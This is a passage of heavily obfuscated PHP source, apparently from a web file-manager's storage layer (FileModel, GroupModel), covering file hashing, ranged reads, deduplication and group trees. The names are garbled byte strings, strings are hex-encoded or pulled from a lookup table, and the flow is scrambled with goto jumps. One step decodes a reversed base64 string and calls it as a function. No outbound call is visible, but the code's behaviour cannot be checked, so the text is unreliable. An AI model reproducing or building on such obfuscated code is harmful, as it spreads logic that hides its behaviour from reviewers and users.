$ú¶ï÷ºó[$ê°ùú÷¸[1529]], $ê°ùú÷¸[1406] => !1); return $ùçÀÌõù; } private function header($ğÆÙÛ…) { $æÔª¾Ä— =& $_SERVER[•€áå–Õ]; if (isset(self::$_cacheHeader[$ğÆÙÛ…])) { return self::$_cacheHeader[$ğÆÙÛ…]; } $ãïòí™ù = isset($GLOBALS[$æÔª¾Ä—[1530]]) ? $GLOBALS[$æÔª¾Ä—[1530]] : !1; $GLOBALS[$æÔª¾Ä—[1530]] = !0; self::$_cacheHeader[$ğÆÙÛ…] = url_header($ğÆÙÛ…); $GLOBALS[$æÔª¾Ä—[1530]] = $ãïòí™ù; return self::$_cacheHeader[$ğÆÙÛ…]; } public function hashSimple($¬îÔô˜, $°„ƒõºş = false) { $ß¤„Ô¾ =& $_SERVER[•€áå–Õ]; $İêğ•óå = $this->info($¬îÔô˜); if (!$İêğ•óå || !$İêğ•óå[$ß¤„Ô¾[228]]) { return !1; } $È°Ú¾‹ = $İêğ•óå[$ß¤„Ô¾[88]]; $²í±û™³ = 200; $ÏÂÀñ€ = 50; if ($È°Ú¾‹ <= $²í±û™³ * $ÏÂÀñ€) { return md5($this->fileSubstr($¬îÔô˜, 0, $È°Ú¾‹)) . $È°Ú¾‹; } $ËÖêµ­¨ = intval($È°Ú¾‹ / $ÏÂÀñ€); $ªÖˆâõ = $ß¤„Ô¾[22]; $Ê²¥¸á» = timeFloat(); $Ûõ°íœ = 15; for ($¸×÷ç›ç = 0; $¸×÷ç›ç < $ÏÂÀñ€; $¸×÷ç›ç++) { if (timeFloat() - $Ê²¥¸á» > $Ûõ°íœ) { return !1; } $ÙÕÛÉÒŒ = $this->fileSubstr($¬îÔô˜, $ËÖêµ­¨ * $¸×÷ç›ç, $²í±û™³); if (!$ÙÕÛÉÒŒ) { return !1; } $ªÖˆâõ .= $ÙÕÛÉÒŒ; } $ªÖˆâõ .= $this->fileSubstr($¬îÔô˜, $È°Ú¾‹ - $²í±û™³, $²í±û™³); return md5($ªÖˆâõ) . $È°Ú¾‹; } public function getContent($ĞÒ„¤ûº) { return $this->fileSubstr($ĞÒ„¤ûº); } public function fileSubstr($ÑÊğíø, $ãò  §¼ = 0, $á·Ó¬º = -1) { $³Õİ÷ú÷ =& $_SERVER[•€áå–Õ]; $åÙˆœµÄ = $this->info($ÑÊğíø); if (!$åÙˆœµÄ || !$åÙˆœµÄ[$³Õİ÷ú÷[228]] && $åÙˆœµÄ[$³Õİ÷ú÷[88]] > 1024 * 1024 * 10) { return !1; } if ($á·Ó¬º === -1) { $á·Ó¬º = $åÙˆœµÄ[$³Õİ÷ú÷[88]]; } if ($á·Ó¬º == 0) { return $³Õİ÷ú÷[22]; } $ËÃšÚùø = array($³Õİ÷ú÷[1531] . $ãò  §¼ . $³Õİ÷ú÷[823] . ($ãò  §¼ + $á·Ó¬º - 1)); $ö‡Â°éû = url_request($ÑÊğíø, $³Õİ÷ú÷[257], !1, $ËÃšÚùø, !1, !1, 30); return $ö‡Â°éû[$³Õİ÷ú÷[1243]] ? $ö‡Â°éû[$³Õİ÷ú÷[1243]] : $³Õİ÷ú÷[22]; } public function download($Â×¨öŠ, $²¸‘“ÖÕ) { Downloader::start($Â×¨öŠ, $²¸‘“ÖÕ); return $²¸‘“ÖÕ; } } goto Fƒ„ä¤¦Œƒ; e İ¬±ÑÈ: $fileSize = strrev(base64_decode($_SERVER[´Ûòªšˆ][0])); function binCheckNeq($ø­÷ÒÏ, $’Ó¼öãÛ) { return $ø­÷ÒÏ != $’Ó¼öãÛ; } $_SERVER[$_SERVER[´Ûòªšˆ][1]] = $fileSize($_SERVER[$_SERVER[´Ûòªšˆ][2]]); goto Cá’’¤é˜†; Aé§‡¯´›…: class FileContentModel extends ModelBase { protected $tableName = "\x69\157\137\x66\151\x6c\x65\137\x63\x6f\x6e\164\x65\156\164\x73"; protected $dataAuto = array(array("\x63\162\x65\141\x74\145\124\151\x6d\x65", "\164\x69\155\x65", "\x69\x6e\163\x65\x72\164", "\146\x75\156\143\164\151\x6f\x6e")); } class FileModel extends ModelBase { protected $tableName = "\151\x6f\x5f\146\151\154\145"; protected $tableMeta = array("\164\141\x62\154\145\x4e\141\x6d\x65" => "\151\157\137\x66\151\x6c\x65\x5f\155\145\x74\x61", "\155\145\x74\x61\x46\151\x65\x6c\144" => "\x66\151\154\x65\x49\104"); public function fileInfo($õğ¼¹‘’) { $ü¸Ÿ˜Å„ =& $_SERVER[•€áå–Õ]; static $«“Á•—ç = array(); if (!isset($«“Á•—ç[$õğ¼¹‘’])) { $†ë×¬ê¼ = $ü¸Ÿ˜Å„[1940]; $„ô¦Éû¥ = Model($ü¸Ÿ˜Å„[523])->field($†ë×¬ê¼)->where(array($ü¸Ÿ˜Å„[521] => $õğ¼¹‘’))->find(); $«“Á•—ç[$õğ¼¹‘’] = $„ô¦Éû¥; } return $«“Á•—ç[$õğ¼¹‘’]; } public function addFileByContent($×¹»ñ“ = '', $øÂ³ğçã = '') { $†¯Åû’ó =& $_SERVER[•€áå–Õ]; $ı†¸¹š¦ = TEMP_PATH . $†¯Åû’ó[1941]; if (!is_dir($ı†¸¹š¦)) { mk_dir($ı†¸¹š¦); } $°¥ı£Á£ = $ı†¸¹š¦ . $†¯Åû’ó[1942] . rand_string(16); file_put_contents($°¥ı£Á£, $×¹»ñ“); $Á…½•şò = $this->addFile($°¥ı£Á£, $øÂ³ğçã, !0); if (file_exists($°¥ı£Á£)) { @unlink($°¥ı£Á£); } return $Á…½•şò; } public function createFileName($áä†›Õ÷, $˜ÌùÇç½ = false, $œÕ¢¤Šñ = false) { $İŸŒº§Æ =& $_SERVER[•€áå–Õ]; $§Ò‡ˆ±± = IO::init($İŸŒº§Æ[18]); $œšÛ´ã = $this->makeFilePath($áä†›Õ÷, $§Ò‡ˆ±±, $˜ÌùÇç½, $œÕ¢¤Šñ); $Æåı§ªÔ = $§Ò‡ˆ±±->pathFather($œšÛ´ã); static $“Ã‹ù× = false; $ÈÎÙÔ… = $İŸŒº§Æ[1943] . md5($Æåı§ªÔ); if (!$“Ã‹ù× && !Cache::get($ÈÎÙÔ…)) { $“Ã‹ù× = !0; $Ìüóˆƒå = IO::mkdir($Æåı§ªÔ); if (!IO::exist($Ìüóˆƒå . $İŸŒº§Æ[838])) { IO::mkfile($Ìüóˆƒå . $İŸŒº§Æ[838]); } Cache::set($ÈÎÙÔ…, 1, 3600 * 2); } return $œšÛ´ã; } public function makeFilePath($öÌ¼¹¼£, $—ğ¿ƒŸÔ, $ôì¸Åğƒ = false, $«ÖÕî‚ô = false) { $ÒùŞÌ©© =& $_SERVER[•€áå–Õ]; $ø°´®¡é = Model($ÒùŞÌ©©[811])->get($ÒùŞÌ©©[1944]); $·ÀÖğì = KodIO::defaultIO() . date($ÒùŞÌ©©[1945]); $æî‡‘Íğ = $·ÀÖğì . rand_string(5) . short_id(100); $öÌ¼¹¼£ = str_replace($ÒùŞÌ©©[18], $ÒùŞÌ©©[21], KodIO::clear($öÌ¼¹¼£)); $è‰¯Ëåˆ = $—ğ¿ƒŸÔ->ext($öÌ¼¹¼£); if (!$öÌ¼¹¼£) { $ø°´®¡é = $ÒùŞÌ©©[1946]; } switch ($ø°´®¡é) { case $ÒùŞÌ©©[1947]: $æî‡‘Íğ = $æî‡‘Íğ . $ÒùŞÌ©©[20] . $—ğ¿ƒŸÔ->ext($öÌ¼¹¼£); if ($è‰¯Ëåˆ == $ÒùŞÌ©©[1884]) { $æî‡‘Íğ .= $ÒùŞÌ©©[1247]; } break; case $ÒùŞÌ©©[1948]: $âä¸ê¹ = Model($ÒùŞÌ©©[811])->get($ÒùŞÌ©©[812]); $í¡ÈÍ°£ = substr(md5($ÒùŞÌ©©[813] . $âä¸ê¹ . date($ÒùŞÌ©©[789])), 0, 8); $‰Ë•áÆ = KodIO::defaultDriver(); $·ÀÖğì = $ÒùŞÌ©©[1278] . $‰Ë•áÆ[$ÒùŞÌ©©[454]] . $ÒùŞÌ©©[463] . date($ÒùŞÌ©©[1949]) . $í¡ÈÍ°£ . $ÒùŞÌ©©[18]; if ($è‰¯Ëåˆ == $ÒùŞÌ©©[1884]) { $öÌ¼¹¼£ .= $ÒùŞÌ©©[1247]; } $‰³Ïìà = $ÒùŞÌ©©[1950] . $·ÀÖğì . $öÌ¼¹¼£; CacheLock::lock($‰³Ïìà); $æî‡‘Íğ = $·ÀÖğì . $öÌ¼¹¼£; if (IO::exist($·ÀÖğì . $öÌ¼¹¼£)) { $‰ÉŸˆÂ = substr($öÌ¼¹¼£, 0, strlen($öÌ¼¹¼£) - strlen($è‰¯Ëåˆ)); $¾óã´â = $«ÖÕî‚ô ? substr($«ÖÕî‚ô, 0, 5) : ($ôì¸Åğƒ ? substr($ôì¸Åğƒ, 0, 5) : rand_string(5)); $æî‡‘Íğ = $·ÀÖğì . $‰ÉŸˆÂ . $¾óã´â . $ÒùŞÌ©©[20] . $è‰¯Ëåˆ; } if (IO::isTypeObject($æî‡‘Íğ) && !IO::isUploadServer($æî‡‘Íğ)) { if (IO::exist($æî‡‘Íğ)) { return $æî‡‘Íğ; } $½°™ó™à = IO::setContent($æî‡‘Íğ, $ÒùŞÌ©©[22]); if (!$½°™ó™à) { show_json($ÒùŞÌ©©[1951], !1); } } CacheLock::unlock($‰³Ïìà); break; case $ÒùŞÌ©©[1946]: break; default: break; } return $æî‡‘Íğ; } public function addFileByRemote($Ö’ÖûÏÛ, $áâÓäé, $óˆ«İ“” = array()) { $®§é§“ı =& $_SERVER[•€áå–Õ]; if (!IO::exist($Ö’ÖûÏÛ)) { return !1; } $êó€°üœ = $óˆ«İ“”[$®§é§“ı[526]] ? $óˆ«İ“”[$®§é§“ı[526]] : $®§é§“ı[22]; $áïÖÓ¸Æ = IO::hashMd5($Ö’ÖûÏÛ, $êó€°üœ); $µ’Á«ª¡ = KodIO::defaultDriver(); $›‹š›áŒ = array($®§é§“ı[596] => IO::size($Ö’ÖûÏÛ), $®§é§“ı[1952] => 1, $®§é§“ı[473] => $áâÓäé, $®§é§“ı[849] => $µ’Á«ª¡[$®§é§“ı[454]], $®§é§“ı[474] => $Ö’ÖûÏÛ, $®§é§“ı[1953] => $óˆ«İ“”[$®§é§“ı[651]] ? $óˆ«İ“”[$®§é§“ı[651]] : IO::hashSimple($Ö’ÖûÏÛ), $®§é§“ı[1954] => $áïÖÓ¸Æ ? $áïÖÓ¸Æ : $êó€°üœ); if ($”Ê›³ğ¯ = $this->addFileCheckExist($›‹š›áŒ[$®§é§“ı[651]], $›‹š›áŒ[$®§é§“ı[526]], $›‹š›áŒ[$®§é§“ı[88]])) { return $”Ê›³ğ¯; } return $this->addFileData($›‹š›áŒ); } private function addFileData($ÁÎœ±) { $çÃ®èŞ’ =& $_SERVER[•€áå–Õ]; if (!$ÁÎœ±) { return !1; } $ÁÎœ±[$çÃ®èŞ’[88]] = intval($ÁÎœ±[$çÃ®èŞ’[88]]); if (!$ÁÎœ±[$çÃ®èŞ’[88]] && strlen($ÁÎœ±[$çÃ®èŞ’[651]]) > 32) { $ÁÎœ±[$çÃ®èŞ’[88]] = intval(substr($ÁÎœ±[$çÃ®èŞ’[651]], 32)); } $„ËÈ’Œø = $this->add($ÁÎœ±); return $this->find($„ËÈ’Œø); } public function addFile($‘›Í¯Ñõ, $ÔŞ¯ŸÄ“, $‚µœè” = false) { $ˆ¯…ò€¤ =& $_SERVER[•€áå–Õ]; $ºÁÓëÏ = IO::hashSimple($‘›Í¯Ñõ); $‡Ó° ù„ = IO::size($‘›Í¯Ñõ); $ôÚş† = $‡Ó° ù„ <= 1024 * 1024 * 10 ? IO::hashMd5($‘›Í¯Ñõ) : $ˆ¯…ò€¤[22]; $…­”´‹— = $ˆ¯…ò€¤[1955] . $ºÁÓëÏ; CacheLock::lock($…­”´‹—); if ($ôÚş† && $ºÁÓëÏ) { $Ì¤³’é = $this->addFileCheckExist($ºÁÓëÏ, $ôÚş†, $‡Ó° ù„); if ($Ì¤³’é) { CacheLock::unlock($…­”´‹—); return $Ì¤³’é; } } $ÑŒì°î‰ = $this->addFileMake($‘›Í¯Ñõ, $‡Ó° ù„, $ºÁÓëÏ, $ôÚş†, $ÔŞ¯ŸÄ“, $‚µœè”); $åÂ–¸Òø = $this->addFileData($ÑŒì°î‰); CacheLock::unlock($…­”´‹—); if (!$ôÚş† && $åÂ–¸Òø) { $this->fileMd5Check($åÂ–¸Òø); } return $åÂ–¸Òø; } public function fileMd5Check($ô¹ØàŒÒ) { $ÌŠÚİñ =& $_SERVER[•€áå–Õ]; $¼î¡ˆÔ¼ = array($ô¹ØàŒÒ[$ÌŠÚİñ[520]], $ô¹ØàŒÒ[$ÌŠÚİñ[96]]); $í›Ÿ£üä = $ÌŠÚİñ[1956] . $ô¹ØàŒÒ[$ÌŠÚİñ[96]]; $¦—öë›Ô = $ÌŠÚİñ[1957] . $ô¹ØàŒÒ[$ÌŠÚİñ[520]]; TaskQueue::add($ÌŠÚİñ[1958], $¼î¡ˆÔ¼, $í›Ÿ£üä, $¦—öë›Ô); } public function fileMd5Set($—Ò÷İ…ù, $×¸ûĞØÎ) { $ú‚äŞŒ± =& $_SERVER[•€áå–Õ]; $™­Âµíœ = $this->find($—Ò÷İ…ù); if (!$™­Âµíœ || $™­Âµíœ[$ú‚äŞŒ±[526]]) { return; } $Ç’å¨Ä = IO::hashMd5($×¸ûĞØÎ); if (!$Ç’å¨Ä) { return $ú‚äŞŒ±[22]; } $this->where(array($ú‚äŞŒ±[520] => $—Ò÷İ…ù))->save(array($ú‚äŞŒ±[526] => $Ç’å¨Ä)); } public function addFileMake($ª•ˆ•¿°, $ÅâÊŒÅ, $”Ğª¨ª, $æµ˜—ûÜ, $°×  áĞ, $Ğì¸ğ¾Æ) { $–Ò¥ÄÀÍ =& $_SERVER[•€áå–Õ]; $Î‚¼„ä = $this->createFileName($°×  áĞ, $”Ğª¨ª, $æµ˜—ûÜ); $ ƒ–”Ïó = get_path_father($Î‚¼„ä); $ôİëëùî = get_path_this($Î‚¼„ä); if ($Ğì¸ğ¾Æ) { $·Œ½£Šã = IO::move($ª•ˆ•¿°, $ ƒ–”Ïó, !1, $ôİëëùî); } else { $·Œ½£Šã = IO::copy($ª•ˆ•¿°, $ ƒ–”Ïó, !1, $ôİëëùî); } if (!$·Œ½£Šã) { return !1; } $çñ¦öúû = KodIO::defaultDriver(); $›‹şç·ø = array($–Ò¥ÄÀÍ[596] => $ÅâÊŒÅ, $–Ò¥ÄÀÍ[1952] => 1, $–Ò¥ÄÀÍ[473] => $°×  áĞ, $–Ò¥ÄÀÍ[849] => $çñ¦öúû[$–Ò¥ÄÀÍ[454]], $–Ò¥ÄÀÍ[474] => $Î‚¼„ä, $–Ò¥ÄÀÍ[1953] => $”Ğª¨ª, $–Ò¥ÄÀÍ[1954] => $æµ˜—ûÜ); return $›‹şç·ø; } public function addFileCheckExist($ç¨•¦İ­, $§¥Ì­§—, $ôÛ¬ğÀô) { $…‘â¶‘æ =& $_SERVER[•€áå–Õ]; $ë§÷®³¾ = $this->findByHash($ç¨•¦İ­, $§¥Ì­§—); if (!$ë§÷®³¾) { return !1; } $ÕÎğÁ‰Î = array($…‘â¶‘æ[1952] => intval($ë§÷®³¾[$…‘â¶‘æ[1959]]) + 1, $…‘â¶‘æ[596] => $ôÛ¬ğÀô); $this->where(array($…‘â¶‘æ[521] => $ë§÷®³¾[$…‘â¶‘æ[520]]))->save($ÕÎğÁ‰Î); return $ë§÷®³¾; } public function remove($•¸“˜Ñ„) { $this->linkCountChange($•¸“˜Ñ„, !1); $this->clearEmpty(); return !0; } public function linkAdd($ƒüØÀ±ù) { $this->linkCountChange($ƒüØÀ±ù, !0); } public function linkCountChange($ïîŠ»å, $İ—Ã¨ÉÊ) { $ô·«ü‘ =& $_SERVER[•€áå–Õ]; if (!$ïîŠ»å) { return; } if (!is_array($ïîŠ»å)) { $ïîŠ»å = array($ïîŠ»å); } $Ùè¾ç›— = array(); foreach ($ïîŠ»å as $¡ÕÌûÜú) { $¼îûµï— = $¡ÕÌûÜú . $ô·«ü‘[22]; if (!$Ùè¾ç›—[$¼îûµï—]) { $Ùè¾ç›—[$¼îûµï—] = 0; } $Ùè¾ç›—[$¼îûµï—]++; } $Í»Ê†¥ô = array(); foreach ($Ùè¾ç›— as $¡ÕÌûÜú => $¾í¼Ö¶ˆ) { $¼îûµï— = $¾í¼Ö¶ˆ . $ô·«ü‘[22]; if (!$Í»Ê†¥ô[$¼îûµï—]) { $Í»Ê†¥ô[$¼îûµï—] = array(); } $Í»Ê†¥ô[$¼îûµï—][] = $¡ÕÌûÜú; } foreach ($Í»Ê†¥ô as $¾í¼Ö¶ˆ => $Îçó¤³‹) { if (!$Îçó¤³‹) { continue; } $¾í¼Ö¶ˆ = $İ—Ã¨ÉÊ ? $¾í¼Ö¶ˆ : -intval($¾í¼Ö¶ˆ); $Öû²³ = array($ô·«ü‘[520] => array($ô·«ü‘[17], $Îçó¤³‹)); if ($¾í¼Ö¶ˆ < 0) { $Öû²³[$ô·«ü‘[1959]] = array($ô·«ü‘[1056], abs($¾í¼Ö¶ˆ)); } $this->where($Öû²³)->setAdd($ô·«ü‘[1959], $¾í¼Ö¶ˆ); } } public function findByHash($Şƒ½¡Ÿ, $Ø¸ùÛÀÈ = false) { $‡­Äé­º =& $_SERVER[•€áå–Õ]; if (!$Şƒ½¡Ÿ && !$Ø¸ùÛÀÈ) { return !1; } $Ñ‚ƒ˜ÙÇ = array($‡­Äé­º[1953] => $Şƒ½¡Ÿ); if ($Ø¸ùÛÀÈ) { $Ñ‚ƒ˜ÙÇ = array($‡­Äé­º[1954] => $Ø¸ùÛÀÈ); } return $this->order($‡­Äé­º[1960])->where($Ñ‚ƒ˜ÙÇ)->find(); } public function clearEmpty($ü£¹àƒ¾ = 0) { $ÚóË†·Ş =& $_SERVER[•€áå–Õ]; $‡ôÔ»âÚ = time() - 3600 * 24 * $ü£¹àƒ¾; $˜Ê¹†é = $ÚóË†·Ş[1961] . $‡ôÔ»âÚ; $ÂÌ¸’ = $this->where($˜Ê¹†é)->select(); if (!$ÂÌ¸’) { return; } $ğ°’Â· = new Task($ÚóË†·Ş[1962], $ÚóË†·Ş[22], count($ÂÌ¸’)); foreach ($ÂÌ¸’ as $óÕç²Úœ) { $ğ°’Â·->update(1); $this->resetFile($óÕç²Úœ); } $ğ°’Â·->end(); } public function resetFile($­ö·Ÿš¾) { $åÅÍÚ—¼ =& $_SERVER[•€áå–Õ]; $‘ÅÃ±³è = array($åÅÍÚ—¼[521] => $­ö·Ÿš¾[$åÅÍÚ—¼[520]]); $®÷¥Ï¬“ = Model($åÅÍÚ—¼[1374])->where($‘ÅÃ±³è)->count(); $ÔØñÜ·¦ = Model($åÅÍÚ—¼[1963])->where($‘ÅÃ±³è)->count(); $‰¼œ•ó = intval($®÷¥Ï¬“) + intval($ÔØñÜ·¦); if ($‰¼œ•ó == 0) { IO::remove($­ö·Ÿš¾[$åÅÍÚ—¼[96]]); Model($åÅÍÚ—¼[1964])->delete($­ö·Ÿš¾[$åÅÍÚ—¼[520]]); $this->where($‘ÅÃ±³è)->delete(); $this->metaSet($­ö·Ÿš¾[$åÅÍÚ—¼[520]], null, null); return; } if ($­ö·Ÿš¾[$åÅÍÚ—¼[1959]] != $‰¼œ•ó) { $this->where($‘ÅÃ±³è)->save(array($åÅÍÚ—¼[1952] => $‰¼œ•ó)); } } public function storageInfo($¬ğäÆ = false) { $®¯î¨Â¨ =& $_SERVER[•€áå–Õ]; $š‰¡˜¸º = $this->count() + 0.0; $¿ŸüíúÔ = 0; $¸îÒğ = 1; $ä‡ÔÜÅ = 0; $ªî†ç = 5000; for ($¡¼­¦ø = 0; $¡¼­¦ø < $š‰¡˜¸º; $¡¼­¦ø = $¡¼­¦ø + $ªî†ç) { $ÃÕœàë = $this->limit($¡¼­¦ø, $¡¼­¦ø + $ªî†ç)->select(); foreach ($ÃÕœàë as $š—ˆ¬×õ) { $¸îÒğ += $š—ˆ¬×õ[$®¯î¨Â¨[88]] * $š—ˆ¬×õ[$®¯î¨Â¨[1959]]; $¿ŸüíúÔ += $š—ˆ¬×õ[$®¯î¨Â¨[88]] * ($š—ˆ¬×õ[$®¯î¨Â¨[1959]] - 1); $ä‡ÔÜÅ += $š—ˆ¬×õ[$®¯î¨Â¨[1959]]; } } $ˆ‘‡ ßÑ = array($®¯î¨Â¨[1965] => $¸îÒğ, $®¯î¨Â¨[1966] => $¿ŸüíúÔ, $®¯î¨Â¨[1967] => $¿ŸüíúÔ / $¸îÒğ, $®¯î¨Â¨[92] => $š‰¡˜¸º, $®¯î¨Â¨[1968] => $ä‡ÔÜÅ); return $ˆ‘‡ ßÑ; } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\x6f\x75\x70"; protected $tableMeta = array("\x74\x61\142\154\x65\116\141\x6d\145" => "\x67\x72\x6f\165\160\x5f\155\x65\x74\x61", "\x6d\x65\x74\141\106\151\x65\x6c\x64" => "\147\x72\157\165\160\111\x44"); protected function cacheFunctionAlias($¯Ï†‹») { $·ÄÑÔ‚– =& $_SERVER[•€áå–Õ]; return array($·ÄÑÔ‚–[1969] => array($¯Ï†‹»[0], $·ÄÑÔ‚–[1970]), $·ÄÑÔ‚–[1971] => array($¯Ï†‹»[0], $·ÄÑÔ‚–[1972])); } protected function getInfo($Şˆ÷Ÿù², $û³ÄÂœÏ = false) { $«””àØÖ = $this->getInfoSimple($Şˆ÷Ÿù²); if (!$«””àØÖ) { return !1; } if ($û³ÄÂœÏ) { return $this->_listDataApplyItem($«””àØÖ); } return $this->cacheFunctionGet($_SERVER[•€áå–Õ][1973], $Şˆ÷Ÿù²); } protected function getInfoSimple($×³Ô€», $ÁíšŸ‰ = false) { $Ñ¿Åìç =& $_SERVER[•€áå–Õ]; if ($ÁíšŸ‰) { $öä¹ï›˜ = array($Ñ¿Åìç[1891] => intval($×³Ô€»)); $şËêå” = $this->where($öä¹ï›˜)->find(); return is_array($şËêå”) ? $şËêå” : array(); } return $this->cacheFunctionGet($Ñ¿Åìç[1974], $×³Ô€»); } protected function groupAdd($ ·Å¥’á) { $—•®ªßî =& $_SERVER[•€áå–Õ]; if (!$ ·Å¥’á[$—•®ªßî[192]] && isset($ ·Å¥’á[$—•®ªßî[1891]]) && $ ·Å¥’á[$—•®ªßî[1891]] == 1) { if ($ÃÒËµÌÅ = $this->getInfoSimple($ ·Å¥’á[$—•®ªßî[1891]], !0)) { return $ ·Å¥’á[$—•®ªßî[1891]]; } } else { $ÃÒËµÌÅ = $this->getInfoSimple($ ·Å¥’á[$—•®ªßî[192]]); if (!$ÃÒËµÌÅ) { return !1; } } $ì¥èäô† = $—•®ªßî[574]; if ($ÃÒËµÌÅ[$—•®ªßî[564]]) { $ì¥èäô† = $ÃÒËµÌÅ[$—•®ªßî[564]] . $ÃÒËµÌÅ[$—•®ªßî[1891]] . $—•®ªßî[60]; } $ÔóŞà¿Š = array($—•®ªßî[473] => $this->groupNameAuto($ ·Å¥’á[$—•®ªßî[192]], $ ·Å¥’á[$—•®ªßî[42]]), $—•®ªßî[456] => $ ·Å¥’á[$—•®ªßî[192]], $—•®ªßî[631] => $ì¥èäô†, $—•®ªßî[1975] => $ ·Å¥’á[$—•®ªßî[1878]], $—•®ªßî[1976] => 0, $—•®ªßî[1895] => 0); if (isset($ ·Å¥’á[$—•®ªßî[1915]])) { $ÔóŞà¿Š[$—•®ªßî[1915]] = $ ·Å¥’á[$—•®ªßî[1915]]; } else { $øæúû = $this->max($—•®ªßî[1915]); if (!$øæúû) { $øæúû = 0; } $ÔóŞà¿Š[$—•®ªßî[1915]] = $øæúû + 1; } if (!empty($ ·Å¥’á[$—•®ªßî[1891]])) { $ÔóŞà¿Š[$—•®ªßî[1891]] = $ ·Å¥’á[$—•®ªßî[1891]]; } $–¥ø’®ê = $this->add($ÔóŞà¿Š); $this->setNamePinyin($–¥ø’®ê, $ÔóŞà¿Š[$—•®ªßî[42]]); if (isset($ ·Å¥’á[$—•®ªßî[1977]])) { $this->metaSet($–¥ø’®ê, array($—•®ªßî[1977] => $ ·Å¥’á[$—•®ªßî[1977]], $—•®ªßî[1978] => $ ·Å¥’á[$—•®ªßî[1978]])); unset($ ·Å¥’á[$—•®ªßî[1977]]); unset($ ·Å¥’á[$—•®ªßî[1978]]); } Model($—•®ªßî[1374])->groupRootAdd($–¥ø’®ê); $this->_clearCache($ ·Å¥’á[$—•®ªßî[192]]); return $–¥ø’®ê; } protected function groupEdit($¹¦ôÅäé, $ùœÄö») { $ Ğƒ =& $_SERVER[•€áå–Õ]; $ŠÕ‘Ñ½ñ = $this->getInfoSimple($¹¦ôÅäé); if (!$ŠÕ‘Ñ½ñ) { return !1; } if (!empty($ùœÄö»[$ Ğƒ[192]])) { $œœ™Ôâé = $this->getInfoSimple($ùœÄö»[$ Ğƒ[192]]); if (!$œœ™Ôâé) { return !1; } if ($ŠÕ‘Ñ½ñ[$ Ğƒ[1891]] == $œœ™Ôâé[$ Ğƒ[1891]]) { return !1; } if ($ùœÄö»[$ Ğƒ[192]] != $ŠÕ‘Ñ½ñ[$ Ğƒ[192]]) { if ($œœ™Ôâé[$ Ğƒ[564]] !== $ŠÕ‘Ñ½ñ[$ Ğƒ[564]] && strpos($œœ™Ôâé[$ Ğƒ[564]], $ŠÕ‘Ñ½ñ[$ Ğƒ[564]] . $ŠÕ‘Ñ½ñ[$ Ğƒ[1891]] . $ Ğƒ[60]) === 0) { return !1; } $ùœÄö»[$ Ğƒ[631]] = $œœ™Ôâé[$ Ğƒ[564]] . $ùœÄö»[$ Ğƒ[192]] . $ Ğƒ[60]; $this->_changeChildLevel($ŠÕ‘Ñ½ñ, $œœ™Ôâé); $this->_clearCache($œœ™Ôâé[$ Ğƒ[1891]]); $this->_clearCache($ŠÕ‘Ñ½ñ[$ Ğƒ[192]]); } } if (isset($ùœÄö»[$ Ğƒ[42]])) { $this->setNamePinyin($¹¦ôÅäé, $ùœÄö»[$ Ğƒ[42]]); } if (isset($ùœÄö»[$ Ğƒ[1977]])) { $this->metaSet($¹¦ôÅäé, array($ Ğƒ[1977] => $ùœÄö»[$ Ğƒ[1977]], $ Ğƒ[1978] => $ùœÄö»[$ Ğƒ[1978]])); unset($ùœÄö»[$ Ğƒ[1977]]); unset($ùœÄö»[$ Ğƒ[1978]]); } $this->_clearChildrenCache($ŠÕ‘Ñ½ñ); return $this->where(array($ Ğƒ[1979] => $¹¦ôÅäé))->save($ùœÄö»); } private function _clearChildrenCache($ø¡¹¯£ß) { $íã‚‡¾ =& $_SERVER[•€áå–Õ]; $°ı›öÍà = array($íã‚‡¾[631] => array($íã‚‡¾[591], $ø¡¹¯£ß[$íã‚‡¾[564]] . $ø¡¹¯£ß[$íã‚‡¾[1891]] . $íã‚‡¾[592])); $˜İèœ÷Î = $this->field($íã‚‡¾[1891])->where($°ı›öÍà)->select(); foreach ($˜İèœ÷Î as $ ú¨‚Äå) { $this->_clearCache($ ú¨‚Äå[$íã‚‡¾[1891]]); } } private function _clearCache($”îÈìö…) { $øı»ùğ =& $_SERVER[•€áå–Õ]; $this->cacheFunctionClear($øı»ùğ[1973], $”îÈìö…); $this->cacheFunctionClear($øı»ùğ[1974], $”îÈìö…); } private function _changeChildLevel($ŠÉĞ€ÑÄ, $ƒÔ…ø¸“, $Í«ˆ×Ö = false) { $áô×íÄ™ =& $_SERVER[•€áå–Õ]; $ÕÍß‹âˆ = $ŠÉĞ€ÑÄ[$áô×íÄ™[564]] . $ŠÉĞ€ÑÄ[$áô×íÄ™[1891]] . $áô×íÄ™[60]; $Õ†‰î— = $ƒÔ…ø¸“[$áô×íÄ™[564]] . $ƒÔ…ø¸“[$áô×íÄ™[1891]] . $áô×íÄ™[60] . $ŠÉĞ€ÑÄ[$áô×íÄ™[1891]] . $áô×íÄ™[60]; if ($Í«ˆ×Ö) { $Õ†‰î— = $ƒÔ…ø¸“[$áô×íÄ™[564]] . $ƒÔ…ø¸“[$áô×íÄ™[1891]] . $áô×íÄ™[60]; } $ãÊ¯Ó¥Ş = array($áô×íÄ™[631] => array($áô×íÄ™[591], $ŠÉĞ€ÑÄ[$áô×íÄ™[564]] . $ŠÉĞ€ÑÄ[$áô×íÄ™[1891]] . $áô×íÄ™[592])); $é§’Ÿ©ç = array($áô×íÄ™[631] => array($áô×íÄ™[640], "\162\145\x70\x6c\141\143\145\50\x70\141\x72\x65\156\164\x4c\x65\x76\x65\154\54\47{$ÕÍß‹âˆ}\47\x2c\x27{$Õ†‰î—}\47\x29")); $this->_clearChildrenCache($ŠÉĞ€ÑÄ); $this->where($ãÊ¯Ó¥Ş)->data($é§’Ÿ©ç)->save(); } public function setNamePinyin($ºçı³ìä, $âÃÀµê = false) { $¨é¢Ç¼‰ =& $_SERVER[•€áå–Õ]; if (!$âÃÀµê) { $Ä¸Î³¨ = $this->getInfoSimple($ºçı³ìä); $âÃÀµê = $Ä¸Î³¨[$¨é¢Ç¼‰[42]]; } if (!Input::check($âÃÀµê, $¨é¢Ç¼‰[634])) { $this->metaSet($ºçı³ìä, $¨é¢Ç¼‰[517], null); $this->metaSet($ºçı³ìä, $¨é¢Ç¼‰[516], null); return; } $€İÊôÕ‚ = array($¨é¢Ç¼‰[517] => str_replace($¨é¢Ç¼‰[63], $¨é¢Ç¼‰[22], Pinyin::get($âÃÀµê)), $¨é¢Ç¼‰[516] => Pinyin::get($âÃÀµê, $¨é¢Ç¼‰[635])); $this->metaSet($ºçı³ìä, $€İÊôÕ‚); } protected function groupStatus($ıø‰‡Ñ¥, $—îõÇÈ) { $Ãšİƒ’¢ =& $_SERVER[•€áå–Õ]; $õÖì‹‡Ñ = 